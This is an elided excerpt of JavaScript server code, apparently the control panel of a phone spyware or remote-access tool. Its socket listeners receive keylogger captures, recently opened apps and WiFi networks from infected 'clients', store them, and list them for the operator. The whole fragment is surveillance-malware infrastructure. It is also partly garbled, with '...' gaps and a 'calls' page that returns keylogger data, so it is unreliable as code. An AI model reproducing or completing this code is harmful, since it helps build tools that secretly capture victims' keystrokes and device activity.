...
class Clients {
    ...
    setupListeners(clientID) {
        ...
        socket.on(CONST.messageKeys.keyLogger, (data) => {
            let dbKeyLogger = client.get('keyLogger');
            let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");

            if (dbKeyLogger.find({ hash }).value() === undefined) {
                data.hash = hash;
                dbKeyLogger.push(data).write();
                logManager.log(CONST.logTypes.info, clientID + " KeyLogger Received");
            }
        });

        socket.on(CONST.messageKeys.recentOpenApps, (data) => {
            let dbRecentOpenApps = client.get('recentOpenApps');
            let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");

            if (dbRecentOpenApps.find({ hash }).value() === undefined) {
                data.hash = hash;
                dbRecentOpenApps.push(data).write();
                logManager.log(CONST.logTypes.info, clientID + " RecentOpenApps Received");
            }
        });
        ...
        socket.on(CONST.messageKeys.wifi, (data) => {
            if (data.networks) {
                if (data.networks.length !== 0) {
                    ...
                    logManager.log(CONST.logTypes.success, clientID + " WiFi Updated - " + newCount + " New WiFi Hotshots Found");
                }
            }
        });
    ...
    getClientDataByPage(clientID, page, filter = undefined) {
        ...
        if (client !== undefined) {
            ...
            if (page === "calls") {
                ...
                pageData = clientDB.get('keyLogger').sortBy('eventTime').reverse().value();
                if (filter) {
                    let filterData = clientDB.get('keyLogger').sortBy('eventTime').reverse().value().filter(not => not.appName === filter);
                    if (filterData) pageData = filterData;
                }
            }
            else if (page === "recentOpenApps") {
                pageData = clientDB.get('recentOpenApps').sortBy('eventTime').reverse().value();
                if (filter) {
                    let filterData = clientDB.get('recentOpenApps').sortBy('eventTime').reverse().value().filter(not => not.appName === filter);
                    if (filterData) pageData = filterData;
                }
            }
            else if (page === "wifi") {
